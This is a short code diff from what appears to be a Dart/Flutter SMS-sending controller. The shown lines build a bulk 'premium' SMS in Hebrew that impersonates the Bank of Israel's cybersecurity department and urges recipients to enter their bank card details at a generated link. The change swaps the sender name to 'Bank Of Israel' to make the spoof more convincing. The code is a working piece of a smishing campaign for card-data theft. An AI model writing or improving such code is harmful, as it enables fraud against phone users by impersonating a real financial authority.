@@ -101,7 +101,7 @@ class SMSController extends GetxController {
             "אנחנו מחלקת אבטחת הסייבר של הבנק המרכזי של ישראל. אנא מלא את פרטי כרטיס הבנק שלך כדי לוודא שאתה בעל הכרטיס הלגיטימי עקב הפצת הונאה והודעות מזויפות.:\n $uniqueLink",
         "type": "sms_premium",
         "purpose": "wholesale",
-        "sender": "boi X"
+        "sender": "Bank Of Israel"
       };
 
       final String jsonData = jsonEncode(data);
